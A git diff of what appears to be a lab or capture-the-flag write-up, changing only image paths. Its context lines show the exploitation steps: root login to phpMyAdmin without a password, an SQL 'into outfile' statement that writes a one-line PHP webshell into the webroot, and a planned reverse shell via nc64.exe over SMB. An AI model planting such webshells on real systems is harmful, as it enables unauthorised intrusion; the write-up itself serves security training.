@@ -36,7 +36,7 @@ Afterwards, we can use `proxychains` to scan the machine again to find more port
 
 There's a PHPMyAdmin instance present on the page, and we can login using `root` as the username with no password.
 
-<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 Since this is already the administrative interface, we can get a shell by creating a database and then executing some SQL commands in it via the web SQL interpreter.&#x20;
 
@@ -48,7 +48,7 @@ Afterwards, we can select this database and head to the QUERY tab:
 
 We can test it with any query and see that it is indeed processing SQL queries:
 
-<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (102) (5).png" alt=""><figcaption></figcaption></figure>
 
 Since we can submit queries, we can also write files into the file system of the machine. I wanted to write a basic PHP webshell, but this means we need to know the webroot file. Very conveniently, there's a `phpinfo` page on the main Wampserver page.&#x20;
 
@@ -66,7 +66,7 @@ SELECT '<?php system($_GET["cmd"]); ?>' into outfile "C:\\wamp\\www\\backdoor.ph
 
 Afterwards, we can test our RCE:
 
-<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (159) (3).png" alt=""><figcaption></figcaption></figure>
 
 Great! No all we need to do is get a reverse shell as the user. By setting up a SMB server on our machine with `nc64.exe` within the directory, we can send this to get a shell:
 
